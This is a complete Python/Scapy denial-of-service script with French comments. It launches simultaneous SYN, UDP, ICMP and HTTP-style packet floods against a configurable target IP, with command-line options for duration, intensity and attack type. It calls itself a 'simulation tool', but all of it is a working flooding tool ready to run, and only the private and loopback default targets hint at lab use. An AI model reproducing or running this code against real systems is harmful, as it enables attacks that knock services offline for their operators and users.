#!/usr/bin/env python3
from scapy.all import *
import threading
import time
import random
import argparse
import sys
from datetime import datetime

class DDoSAttack:
    def __init__(self, target_ip="192.168.192.67", duration=60, intensity=1.0):
        self.target_ip = target_ip
        self.duration = duration
        self.intensity = max(0.1, min(1.0, intensity))  # Entre 0.1 et 1.0
        self.stop_attack = False
        self.packets_sent = 0
        self.start_time = None
        
    def syn_flood(self):
        """Attaque SYN Flood - Envoie des paquets SYN sans compléter la connexion"""
        print(f"[*] Starting SYN flood attack against {self.target_ip}")
        ports = [80, 443, 8080]  # Ports web communs
        
        while not self.stop_attack:
            try:
                for port in ports:
                    ip = IP(dst=self.target_ip)
                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
                    pkt = ip/tcp
                    send(pkt, verbose=False)
                    self.packets_sent += 1
                time.sleep(0.001 / self.intensity)
            except Exception as e:
                print(f"Error in SYN flood: {e}")
                break

    def udp_flood(self):
        """Attaque UDP Flood - Surcharge avec des paquets UDP"""
        print(f"[*] Starting UDP flood attack against {self.target_ip}")
        
        while not self.stop_attack:
            try:
                # Envoyer sur plusieurs ports en même temps
                ports = random.sample(range(1024, 65535), 10)
                for port in ports:
                    ip = IP(dst=self.target_ip)
                    udp = UDP(sport=RandShort(), dport=port)
                    data = Raw(b"X" * int(1024 * self.intensity))
                    pkt = ip/udp/data
                    send(pkt, verbose=False)
                    self.packets_sent += 1
                time.sleep(0.01 / self.intensity)
            except Exception as e:
                print(f"Error in UDP flood: {e}")
                break

    def icmp_flood(self):
        """Attaque ICMP Flood - Surcharge avec des paquets ICMP"""
        print(f"[*] Starting ICMP flood attack against {self.target_ip}")
        
        while not self.stop_attack:
            try:
                ip = IP(dst=self.target_ip)
                icmp = ICMP(type=8, code=0)  # Echo Request
                data = Raw(b"X" * int(1024 * self.intensity))
                pkt = ip/icmp/data
                send(pkt, verbose=False)
                self.packets_sent += 1
                time.sleep(0.01 / self.intensity)
            except Exception as e:
                print(f"Error in ICMP flood: {e}")
                break

    def http_flood(self):
        """Attaque HTTP Flood - Simule des requêtes HTTP"""
        print(f"[*] Starting HTTP flood attack against {self.target_ip}")
        ports = [80, 443, 8080]
        
        while not self.stop_attack:
            try:
                for port in ports:
                    ip = IP(dst=self.target_ip)
                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
                    
                    # Varier les requêtes HTTP
                    methods = ["GET", "POST", "HEAD"]
                    paths = ["/", "/index.html", "/api/v1/users", "/login", "/admin"]
                    
                    payload = f"{random.choice(methods)} {random.choice(paths)} HTTP/1.1\r\n"
                    payload += f"Host: {self.target_ip}\r\n"
                    payload += "User-Agent: Mozilla/5.0\r\n"
                    payload += "Accept: */*\r\n"
                    if random.random() < 0.3:  # 30% de chance d'ajouter un corps
                        data = "X" * int(100 * self.intensity)
                        payload += f"Content-Length: {len(data)}\r\n\r\n{data}"
                    else:
                        payload += "\r\n"
                    
                    pkt = ip/tcp/payload
                    send(pkt, verbose=False)
                    self.packets_sent += 1
                time.sleep(0.01 / self.intensity)
            except Exception as e:
                print(f"Error in HTTP flood: {e}")
                break

    def start_attack(self, attack_types=None):
        """Démarre les attaques spécifiées"""
        if attack_types is None:
            attack_types = ["syn", "udp", "icmp", "http"]
        
        attack_functions = {
            "syn": self.syn_flood,
            "udp": self.udp_flood,
            "icmp": self.icmp_flood,
            "http": self.http_flood
        }
        
        threads = []
        self.start_time = datetime.now()
        print(f"\nStarting DDoS attack simulation at {self.start_time}")
        print(f"Target IP: {self.target_ip}")
        print(f"Duration: {self.duration} seconds")
        print(f"Intensity: {self.intensity:.1f}")
        print(f"Attack types: {', '.join(attack_types)}\n")
        
        # Démarrer les threads d'attaque
        for attack_type in attack_types:
            if attack_type in attack_functions:
                thread = threading.Thread(target=attack_functions[attack_type])
                thread.daemon = True
                threads.append(thread)
                thread.start()
        
        try:
            # Attendre la durée spécifiée
            time.sleep(self.duration)
            self.stop_attack = True
            
            # Attendre que tous les threads se terminent
            for thread in threads:
                thread.join(timeout=2)
            
            # Afficher les statistiques
            duration = (datetime.now() - self.start_time).total_seconds()
            rate = self.packets_sent / duration if duration > 0 else 0
            print(f"\nAttack completed:")
            print(f"Total packets sent: {self.packets_sent:,}")
            print(f"Average packet rate: {rate:.2f} packets/second")
            print(f"Actual duration: {duration:.2f} seconds")
            
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop_attack = True
            for thread in threads:
                thread.join(timeout=2)

def main():
    parser = argparse.ArgumentParser(description="DDoS Attack Simulation Tool")
    parser.add_argument("-t", "--target", default="127.0.0.1",
                      help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("-d", "--duration", type=int, default=60,
                      help="Attack duration in seconds (default: 60)")
    parser.add_argument("-i", "--intensity", type=float, default=1.0,
                      help="Attack intensity (0.1-1.0, default: 1.0)")
    parser.add_argument("-a", "--attacks", nargs="+", 
                      choices=["syn", "udp", "icmp", "http"],
                      default=["syn", "udp", "icmp", "http"],
                      help="Attack types to use (default: all)")
    
    args = parser.parse_args()
    
    try:
        attack = DDoSAttack(
            target_ip=args.target,
            duration=args.duration,
            intensity=args.intensity
        )
        attack.start_attack(args.attacks)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 